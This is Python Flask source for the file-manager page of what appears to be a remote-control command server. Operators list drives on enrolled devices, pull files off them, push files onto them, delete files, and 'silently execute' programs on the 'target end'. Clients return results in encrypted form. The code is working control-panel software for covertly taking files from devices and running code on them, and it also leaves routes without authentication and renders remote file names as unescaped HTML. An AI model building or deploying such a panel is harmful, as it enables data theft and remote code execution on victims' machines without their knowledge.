from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
from datetime import datetime
import os, time, json, threading
from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data
try:
    from ui import ADMIN_CSS
except Exception:
    ADMIN_CSS = ""

from werkzeug.utils import secure_filename
bp = Blueprint('file', __name__)

@bp.route('/files/<mac>')
def files_page(mac):
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    if mac not in clients_db: return "设备不存在"

    FILES_HTML = r"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
        <title>文件管理 - {{ info.name }} ({{ mac }})</title>
        <style>
            {{ admin_css|safe }}
            body { background: var(--bg); padding: 0; }
            .file-toolbar, .path-bar { background:#fff; border:1px solid var(--line); border-radius:8px; padding:12px; margin-bottom:12px; display:flex; flex-wrap:wrap; gap:8px; align-items:center; }
            .path-bar input { flex:1 1 360px; min-width:180px; }
            .table-responsive { overflow-x:auto; border:1px solid var(--line); border-radius:8px; background:#fff; }
            table { min-width:720px; margin:0; user-select:none; }
            tr:hover { background:#f8fafc; cursor:pointer; }
            .icon { width:28px; text-align:center; display:inline-block; }
            #loading { color:var(--amber); font-weight:700; display:none; }
            #context-menu { display:none; position:absolute; z-index:1000; background:#fff; border:1px solid var(--line); box-shadow:0 12px 28px rgba(15,23,42,.16); border-radius:8px; padding:6px; min-width:190px; }
            .context-item { padding:9px 10px; cursor:pointer; font-size:14px; border-radius:6px; }
            .context-item:hover { background:#eff6ff; color:#1d4ed8; }
            .debug-panel { margin-top:14px; background:#111827; color:#86efac; padding:12px; height:160px; overflow-y:auto; font-family:Consolas,monospace; border-radius:8px; border:1px solid #263244; }
            @media(max-width:640px){ .file-toolbar button,.path-bar button{flex:1 1 calc(50% - 8px)} table{min-width:680px} }
        </style>
    </head>
    <body onclick="hideContextMenu()">
        <main class="shell">
        <div class="header">
            <div><h2>File Manager</h2><div class="subtle">{{ info.name }} [{{ mac }}] <span id="conn_status"></span></div></div>
            <a class="btn muted" href="/">Back</a>
        </div>
        <div class="path-bar">
            <span class="subtle">Path</span>
            <input type="text" id="current_path" value="此电脑" onkeydown="if(event.key==='Enter') loadPath()">
            <button class="btn" onclick="loadPath()">Open</button>
            <button class="btn ok" onclick="loadPath(true)">Refresh</button>
            <span id="loading">Working...</span>
        </div>

        <div class="file-toolbar">
            <input type="file" id="uploadFile" style="display:inline-block; border:1px solid #ccc; padding:3px; max-width: 100%;">
            <button class="btn" onclick="uploadToServer()">Upload here</button>
            <button class="btn muted" onclick="cmdMkdir()">New folder</button>
        </div>

        <div class="table-responsive">
        <table>
            <thead>
                <tr>
                    <th style="width:30px;"><input type="checkbox" onclick="toggleAllFiles(this)"></th>
                    <th style="width:30px;"></th>
                    <th onclick="sortFiles('Name')" style="cursor:pointer; user-select:none;">Name <span id="sort_Name"></span></th>
                    <th onclick="sortFiles('Length')" style="cursor:pointer; user-select:none; width:120px;">Size <span id="sort_Length"></span></th>
                    <th onclick="sortFiles('LastWriteTime')" style="cursor:pointer; user-select:none; width:200px;">Modified <span id="sort_LastWriteTime"></span></th>
                </tr>
            </thead>
            <tbody id="file_list">
                <tr><td colspan="5" style="text-align:center;color:#888;">Open a path to load files.</td></tr>
            </tbody>
        </table>
        </div>

        <!-- Context Menu Template -->
        <div id="context-menu">
            <div class="context-item single-only" id="m_open" onclick="onContextOpen()">Open / Enter</div>
            <div class="context-item single-only" id="m_down" onclick="onContextDown()">Download to server</div>
            <div class="context-item single-only" id="m_exec" onclick="onContextExec()">Run on client</div>
            <div class="context-item single-only" id="m_rn" onclick="onContextRn()">Rename</div>

            <div class="context-item multi-only" id="m_down_multi" onclick="onContextDownMulti()" style="display:none;">Batch download</div>
            <div class="context-item multi-only" id="m_del_multi" onclick="onContextDelMulti()" style="display:none; color:red;">Batch delete</div>

            <div style="border-top:1px solid #ddd; margin:4px 0;" class="single-only"></div>
            <div class="context-item single-only" style="color:red;" id="m_del" onclick="onContextDel()">Delete</div>
        </div>

        <div class="debug-panel">
            <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
                <b>Transfer Log</b>
                <button class="mini" onclick="document.getElementById('debug_log').innerText=''">Clear</button>
            </div>
            <pre id="debug_log" style="white-space: pre-wrap; word-wrap: break-word; margin: 0;"></pre>
        </div>
        </main>

        <script>
            function checkPing() {
                fetch('/api/ping/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    let st = document.getElementById('conn_status');
                    if(data.status === 'online') {
                        st.innerHTML = '🟢 实时设备在线';
                        st.style.color = '#28a745';
                    } else {
                        st.innerHTML = '🔴 设备疑似掉线';
                        st.style.color = 'red';
                    }
                });
            }
            setInterval(checkPing, 3000);
            checkPing();

            function toggleAllFiles(source) {
                document.querySelectorAll('.file-check').forEach(cb => cb.checked = source.checked);
            }

            function sendFileCmdAsync(cmd) {
                return new Promise((resolve) => {
                    sendFileCmd(cmd, res => resolve(res));
                });
            }

            async function onContextDelMulti() {
                let checked = document.querySelectorAll('.file-check:checked');
                if(checked.length === 0) return;
                if(!confirm('确定批量强制删除选中的 ' + checked.length + ' 个项目？')) return;
                hideContextMenu();
                for (let i = 0; i < checked.length; i++) {
                    await sendFileCmdAsync("F_CMD:DEL:" + checked[i].dataset.path);
                }
                loadPath();
            }

            async function onContextDownMulti() {
                let checked = document.querySelectorAll('.file-check:checked');
                if(checked.length === 0) return;
                hideContextMenu();
                for (let i = 0; i < checked.length; i++) {
                    if (checked[i].dataset.isdir === 'true') continue;
                    let path = checked[i].dataset.path;
                    let parts = path.replace(/\\\\/g, '\\').split('\\');
                    let fName = parts[parts.length - 1];
                    let dlLink = "/downloads/{{ mac }}/" + encodeURIComponent(fName);
                    let url = window.location.origin + "/api/file/client_upload/{{ mac }}?fname=" + encodeURIComponent(fName);

                    await sendFileCmdAsync("F_CMD:UP:" + url + "|" + path);
                    logDebug("✅ 成功拉取缓存拉取下载链接：" + dlLink);
                }
                alert("勾选文件的下载请求已依次下发，由于浏览器限制无法一次性自动弹出多个下载窗口，请稍后手动点击调试控制台内的所有成功拉取链接即可下载。");
            }

            function logDebug(msg) {
                try {
                    let el = document.getElementById('debug_log');
                    if (el) {
                        let d = new Date();
                        let ts = d.getHours().toString().padStart(2,'0') + ':' + d.getMinutes().toString().padStart(2,'0') + ':' + d.getSeconds().toString().padStart(2,'0');
                        el.innerText += `[${ts}] ${msg}\n`;
                        el.parentElement.scrollTop = el.parentElement.scrollHeight;
                    }
                } catch(e) { console.error(e); }
            }

            let polling = false;
            let currentSelectedFile = null;
            let currentSelectedIsDir = false;

            let fileSortCol = 'Name';
            let fileSortDir = 1;
            let currentFiles = [];

            function sortFiles(col) {
                if (fileSortCol === col) fileSortDir *= -1;
                else { fileSortCol = col; fileSortDir = 1; }
                renderFiles();
            }

            function renderFiles() {
                let tb = document.getElementById('file_list');
                tb.innerHTML = '';

                ['Name', 'Length', 'LastWriteTime'].forEach(c => {
                    let el = document.getElementById('sort_' + c);
                    if(el) el.innerText = (c === fileSortCol) ? (fileSortDir===1 ? ' ▲' : ' ▼') : '';
                });

                let p = document.getElementById('current_path').value;
                let reqPath = (p === "此电脑" || p === "ROOT") ? "ROOT" : p;

                let sorted = [...currentFiles];
                sorted.sort((a,b) => {
                    if(a.IsDir && !b.IsDir) return -1;
                    if(!a.IsDir && b.IsDir) return 1;
                    let vA = a[fileSortCol];
                    let vB = b[fileSortCol];
                    if(fileSortCol==='Name' || fileSortCol==='LastWriteTime') {
                        vA = (vA||'').toString().toLowerCase();
                        vB = (vB||'').toString().toLowerCase();
                    } else {
                        vA = parseFloat(vA) || 0;
                        vB = parseFloat(vB) || 0;
                    }
                    if(vA < vB) return -1 * fileSortDir;
                    if(vA > vB) return 1 * fileSortDir;
                    return 0;
                });

                if (reqPath !== "ROOT") {
                    let upTr = document.createElement('tr');
                    upTr.innerHTML = `<td></td><td class="icon">📁</td><td colspan="3">..</td>`;
                    upTr.ondblclick = () => goUp();
                    tb.appendChild(upTr);
                }

                sorted.forEach(f => {
                    let tr = document.createElement('tr');
                    let isDir = !!f.IsDir;
                    let fullPath = combinePath(p, f.Name);

                    tr.oncontextmenu = (e) => showContextMenu(e, fullPath, isDir);

                    let cb = `<input type="checkbox" class="file-check" data-path="${fullPath.replace(/"/g, '&quot;')}" data-isdir="${isDir}">`;
                    let displayIcon = isDir ? '📁' : getFileIcon(f.Name);
                    if (reqPath === "ROOT") displayIcon = '💽';
                    tr.innerHTML = `<td>${reqPath !== "ROOT" ? cb : ''}</td><td class="icon">${displayIcon}</td><td>${f.Name}</td><td>${isDir ? '' : formatSize(f.Length)}</td><td>${f.LastWriteTime ? (f.LastWriteTime.DateTime || f.LastWriteTime) : ''}</td>`;

                    tr.querySelectorAll('td:not(:first-child)').forEach(td => {
                        if (isDir) {
                            td.ondblclick = () => openDir(fullPath);
                        } else {
                            td.ondblclick = () => { if(confirm('是否要在远程执行该文件？')) cmdExec(fullPath); };
                        }
                    });
                    tb.appendChild(tr);
                });
            }

            function hideContextMenu() {
                try { document.getElementById('context-menu').style.display = 'none'; } catch(e){}
            }

            function showContextMenu(e, path, isDir) {
                e.preventDefault();
                let clickedCheckbox = e.currentTarget.querySelector('.file-check');
                if (clickedCheckbox && !clickedCheckbox.checked) {
                    clickedCheckbox.checked = true;
                }

                let checked = document.querySelectorAll('.file-check:checked');
                let isMulti = checked.length > 1;

                currentSelectedFile = path;
                currentSelectedIsDir = isDir;

                let menu = document.getElementById('context-menu');
                if(isMulti) {
                    document.querySelectorAll('.single-only').forEach(el => el.style.display = 'none');
                    document.querySelectorAll('.multi-only').forEach(el => el.style.display = 'block');
                } else {
                    document.querySelectorAll('.single-only').forEach(el => el.style.display = 'block');
                    document.querySelectorAll('.multi-only').forEach(el => el.style.display = 'none');

                    document.getElementById('m_open').style.display = isDir ? 'block' : 'none';
                    document.getElementById('m_down').style.display = isDir ? 'none' : 'block';
                    document.getElementById('m_exec').style.display = isDir ? 'none' : 'block';
                }
                menu.style.display = 'block';
                menu.style.left = e.pageX + 'px';
                menu.style.top = e.pageY + 'px';
            }

            function onContextOpen() { if(currentSelectedIsDir) openDir(currentSelectedFile); }
            function onContextDown() { cmdDown(currentSelectedFile); }
            function onContextExec() { cmdExec(currentSelectedFile); }
            function onContextRn() { cmdRn(currentSelectedFile); }
            function onContextDel() { cmdDel(currentSelectedFile); }

            function showLoading(show) {
                document.getElementById('loading').style.display = show ? 'inline' : 'none';
            }

            function sendFileCmd(cmd, callback) {
                showLoading(true);
                logDebug("➤ [发送命令]: " + cmd);
                fetch('/api/file/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: '{{ mac }}', cmd: cmd})
                }).then(res => {
                    logDebug("⏳ [等待响应中...]");
                    pollResult(callback);
                }).catch(err => {
                    logDebug("❌ [发送失败]: " + err);
                    showLoading(false);
                });
            }

            function pollResult(callback) {
                if(polling) return;
                polling = true;
                let tries = 0;
                let itv = setInterval(() => {
                    fetch('/api/file/result/{{ mac }}')
                    .then(r => r.json())
                    .then(data => {
                        if(data.status === 'ready') {
                            clearInterval(itv);
                            polling = false;
                            showLoading(false);
                            logDebug("✅ [获得响应数据成功] 长度: " + (data.data ? data.data.length : 0));
                            callback(data.data);
                        } else {
                            tries++;
                            if (tries > 100) {
                                clearInterval(itv);
                                polling = false;
                                showLoading(false);
                                logDebug("❌ [超时]: 多次轮询未能获取到返回结果");
                            }
                        }
                    }).catch(e => {
                        clearInterval(itv);
                        polling = false;
                        showLoading(false);
                        logDebug("❌ [轮询网络错误]: " + e);
                    });
                }, 200);
            }

            function formatSize(bytes) {
                if (bytes == null) return '';
                if (bytes === 0) return '0 B';
                const k = 1024;
                const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
            }

            function combinePath(parent, fName) {
                if(parent === "此电脑" || parent === "ROOT" || parent === "") return fName + "\\";
                if(parent.endsWith("\\") || parent.endsWith("/")) return parent + fName;
                return parent + "\\" + fName;
            }

            function getFileIcon(fName) {
                if (!fName || typeof fName !== 'string') return '📄';
                let idx = fName.lastIndexOf('.');
                if(idx === -1) return '📄';
                let ext = fName.substring(idx + 1).toLowerCase();
                const icons = {
                    'exe': '⚙️', 'dll': '⚙️', 'sys': '⚙️',
                    'mp4': '🎬', 'mkv': '🎬', 'avi': '🎬', 'mov': '🎬',
                    'mp3': '🎵', 'wav': '🎵', 'flac': '🎵',
                    'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'bmp': '🖼️',
                    'txt': '📝', 'doc': '📝', 'docx': '📝', 'log': '📝',
                    'pdf': '📕',
                    'zip': '🗜️', 'rar': '🗜️', '7z': '🗜️', 'iso': '🗜️', 'tar': '🗜️',
                    'py': '🐍', 'js': '📜', 'html': '🌐', 'css': '🎨', 'go': '🐹', 'cpp': 'Ⓜ️', 'c': 'Ⓜ️'
                };
                return icons[ext] || '📄';
            }

            function loadPath(refresh = false) {
                try {
                let p = document.getElementById('current_path').value;
                if (!p) { p = "此电脑"; document.getElementById('current_path').value = p; }

                let reqPath = (p === "此电脑" || p === "ROOT") ? "ROOT" : p;
                sendFileCmd("F_CMD:LIST:" + reqPath, (resText) => {
                    let tb = document.getElementById('file_list');
                    tb.innerHTML = '';
                    currentFiles = [];

                    try {
                        if (resText) resText = resText.trim();
                        let firstBracket = resText.indexOf('[');
                        let firstBrace = resText.indexOf('{');
                        if (firstBracket >= 0 && (firstBrace === -1 || firstBracket < firstBrace)) {
                            resText = resText.substring(firstBracket);
                            let lastBracket = resText.lastIndexOf(']');
                            if (lastBracket > -1) resText = resText.substring(0, lastBracket + 1);
                        } else if (firstBrace >= 0) {
                            resText = resText.substring(firstBrace);
                            let lastBrace = resText.lastIndexOf('}');
                            if (lastBrace > -1) resText = resText.substring(0, lastBrace + 1);
                        }

                        let parsed = JSON.parse(resText);
                        if(Array.isArray(parsed)) {
                            currentFiles = parsed;
                        } else if(parsed && parsed.Name) { 
                            currentFiles = [parsed];
                        }
                    } catch(e) {
                         logDebug("❌ [JSON解析失败]: " + e);
                         tb.innerHTML = '<tr><td colspan="5">没有可用的文件或解析结果失败</td></tr>';
                         return;
                    }
                    renderFiles();
                });
                } catch(topE) { logDebug("❌ [JS异常]: " + topE); }
            }

            function openDir(path) {
                document.getElementById('current_path').value = path;
                loadPath();
            }

            function goUp() {
                let p = document.getElementById('current_path').value;
                if(p === "此电脑" || p === "ROOT") return;
                p = p.replace(/\\$/, '');
                let lastSlash = p.lastIndexOf('\\');
                if (lastSlash > 0) {
                    p = p.substring(0, lastSlash);
                    if(p.endsWith(':')) p += '\\';
                    openDir(p);
                } else if (lastSlash === 0) {
                    openDir('\\');
                } else {
                    openDir('此电脑');
                }
            }

            function cmdDel(path) {
                if(!confirm('确定强制删除 ' + path + ' ?')) return;
                sendFileCmd("F_CMD:DEL:" + path, (res) => { alert(res); loadPath(); });
            }

            function cmdRn(path) {
                let newName = prompt('输入新的名称:', 'new_name');
                if(!newName) return;
                let p = document.getElementById('current_path').value;
                sendFileCmd("F_CMD:RN:" + path + "|" + newName, (res) => { alert(res); loadPath(); });
            }

            function cmdDown(path) {
                let parts = path.replace(/\\\\/g, '\\').split('\\');
                let fName = parts[parts.length - 1];
                let fCmdUrl = window.location.origin + "/api/file/client_upload/{{ mac }}?fname=" + encodeURIComponent(fName); 
                sendFileCmd("F_CMD:UP:" + fCmdUrl + "|" + path, (res) => { 
                     logDebug("成功触发下载: " + res);
                     let dlLink = "/downloads/{{ mac }}/" + encodeURIComponent(fName);
                     if(confirm("文件可能已传输至控制端缓存，是否立刻尝试下载?")) {
                         window.location.href = dlLink;
                     }
                });
            }

            function cmdExec(path) {
                if(!confirm('确定要在目标端静默执行 ' + path + ' 吗?')) return;
                sendFileCmd("F_CMD:EXEC:" + path, (res) => { alert("执行返回:\n" + res); });
            }

            function cmdMkdir() {
                let p = document.getElementById('current_path').value;
                let name = prompt('输入文件夹名:');
                if(name) {
                    let full = combinePath(p, name);
                    sendFileCmd("F_CMD:MKDIR:" + full, (res) => { loadPath(); });
                }
            }

            function uploadToServer() {
                let fileInput = document.getElementById('uploadFile');
                if(!fileInput.files.length) { alert("请选择文件"); return; }
                let file = fileInput.files[0];
                let p = document.getElementById('current_path').value;
                let targetPath = combinePath(p, file.name);

                let formData = new FormData();
                formData.append('file', file);

                let uploadUrl = '/api/file/server_upload/{{ mac }}';
                showLoading(true);
                fetch(uploadUrl, { method: 'POST', body: formData })
                .then(r => r.json())
                .then(data => {
                    if (data.status === 'ok') {
                         sendFileCmd("F_CMD:DOWN:" + data.url + "|" + targetPath, (res) => {
                             logDebug("受控端接管下载完成: " + res);
                             loadPath();
                         });
                    } else {
                         alert("上传服务失败");
                         showLoading(false);
                    }
                }).catch(e => { alert(e); showLoading(false); });
            }

            setTimeout(() => {
                logDebug("页面加载完成，准备拉取目录...");
                loadPath();
            }, 500);
        </script>
    </body>
    </html>
    """
    return render_template_string(FILES_HTML, admin_css=ADMIN_CSS, mac=mac, info=clients_db[mac])

@bp.route('/api/file/client_upload/<mac>', methods=['POST'])
def client_upload(mac):
    f = request.files.get('file')
    if f:
        dest_dir = os.path.join(UPDATE_DIR, 'downloads', mac)
        os.makedirs(dest_dir, exist_ok=True)
        # Using secure_filename might drop unicode characters. Just replace slashes.
        fname = request.args.get('fname') or f.filename
        fname = fname.replace('\\', '/').split('/')[-1]
        safe_name = fname.replace('/', '_').replace('\\', '_')
        f.save(os.path.join(dest_dir, safe_name))
        return "OK", 200
    return "Fail", 400

@bp.route('/downloads/<mac>/<path:filename>')
def serve_download(mac, filename):
    if not session.get('logged_in'): return "未登录", 403
    # 修复：允许正确解析带中文等特殊字符的文件名，防止 werkzeug secure_filename 把特殊字符吃了导致文件无法访问。
    # 我们自己去重构下被替换掉的文件名，或者只把反斜杠过滤，因为前端已经通过 replace 把斜杠替换成下划线了。
    safe_name = filename.replace('/', '_').replace('\\', '_');
    return send_from_directory(os.path.join(UPDATE_DIR, 'downloads', mac), safe_name, as_attachment=True)

@bp.route('/api/file/server_upload/<mac>', methods=['POST'])
def server_upload(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    f = request.files.get('file')
    if f:
        dest_dir = os.path.join(UPDATE_DIR, 'uploads', mac)
        os.makedirs(dest_dir, exist_ok=True)
        safe_name = f.filename.replace('/', '_').replace('\\', '_')
        f.save(os.path.join(dest_dir, safe_name))
        return jsonify({"status": "ok", "url": f"{request.host_url}uploads/{mac}/{safe_name}"})
    return jsonify({"status": "error"}), 400

@bp.route('/uploads/<mac>/<path:filename>')
def serve_upload(mac, filename):
    safe_name = filename.replace('/', '_').replace('\\', '_');
    return send_from_directory(os.path.join(UPDATE_DIR, 'uploads', mac), safe_name)

@bp.route('/api/file/cmd', methods=['POST'])
def api_file_cmd():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    cmd = data.get('cmd')
    if mac in clients_db:
        clients_db[mac]['pending_file_cmd'] = cmd
        clients_db[mac]['file_result'] = None
        save_db()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@bp.route('/file_result', methods=['POST'])
def file_result():
    mac = decrypt_data(request.form.get('mac', ''))
    output = decrypt_data(request.form.get('output', ''))
    if mac in clients_db:
        clients_db[mac]['file_result'] = output
        save_db()
    return "OK", 200

@bp.route('/api/file/result/<mac>')
def api_file_result(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        res = clients_db[mac].get('file_result')
        if res is not None:
            clients_db[mac]['file_result'] = None
            return jsonify({"status": "ready", "data": res})
        return jsonify({"status": "waiting"})
    return jsonify({"status": "error"})

from werkzeug.utils import secure_filename
